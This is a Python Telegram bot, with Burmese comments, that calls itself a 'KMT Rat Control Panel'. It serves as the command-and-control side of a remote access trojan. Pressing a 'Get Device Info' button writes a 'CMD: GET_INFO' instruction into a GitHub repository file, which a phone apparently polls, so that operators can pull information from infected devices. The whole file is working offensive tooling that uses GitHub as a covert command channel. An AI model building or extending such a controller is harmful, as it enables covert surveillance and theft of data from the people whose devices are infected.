import os
import telebot
import requests
import base64

# Render Environment Variables မှ Token များကို ယူခြင်း
TOKEN = os.environ.get('BOT_TOKEN')
GITHUB_TOKEN = os.environ.get('GITHUB_TOKEN')

bot = telebot.TeleBot(TOKEN)

# GitHub အချက်အလက်များ (ကိုယ့်အကောင့်အမည်နှင့် Repo နာမည်ကို ထည့်ပါ)
REPO_OWNER = "qqq1234ttttt"
REPO_NAME = "KMT-All-Software-Rat-Control"
FILE_PATH = "command.txt"

def update_github(command):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_PATH}"
    headers = {
        "Authorization": f"Bearer {GITHUB_TOKEN}", 
        "Accept": "application/vnd.github+json"
    }
    
    # ပထမဦးစွာ GitHub ရှိ file ရဲ့ sha တန်ဖိုးကို ယူပါ
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        sha = response.json()['sha']
        content_encoded = base64.b64encode(command.encode('ascii')).decode('ascii')
        
        data = {
            "message": "Update command from Telegram Bot",
            "content": content_encoded,
            "sha": sha
        }
        # GitHub ဖိုင်ထဲသို့ command အသစ် တင်ခြင်း
        put_res = requests.put(url, headers=headers, json=data)
        if put_res.status_code == 200:
            print("GitHub command updated successfully!")
        else:
            print("Failed to update GitHub:", put_res.text)

# Telegram Bot ထဲတွင် /start နှိပ်လိုက်သောအခါ
@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = telebot.types.InlineKeyboardMarkup()
    # Device Info တောင်းမယ့် Inline ခလုတ်
    btn_device = telebot.types.InlineKeyboardButton("📱 Get Device Info", callback_data="get_device")
    markup.add(btn_device)
    
    bot.send_message(message.chat.id, "KMT Rat Control Panel - အောက်ပါခလုတ်ကို နှိပ်ပါ:", reply_markup=markup)

# ခလုတ်ကို နှိပ်လိုက်သည့်အခါ လုပ်ဆောင်မည့် အပိုင်း
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data == "get_device":
        # GitHub ရှိ command.txt ထဲသို့ CMD: GET_INFO သို့ ပြောင်းလဲရန်
        update_github("CMD: GET_INFO")
        
        bot.answer_callback_query(call.id, "Command Sent!")
        bot.send_message(call.message.chat.id, "📱 Device Info တောင်းဆိုသည့် အမိန့်ကို GitHub သို့ ပို့ပြီးပါပြီ။ ဖုန်းဘက်မှ တုံ့ပြန်မှုကို စောင့်ဆိုင်းနေပါ...")

# Bot ကို စတင်လည်ပတ်စေရန်
if __name__ == "__main__":
    print("Bot is running...")
    bot.infinity_polling()
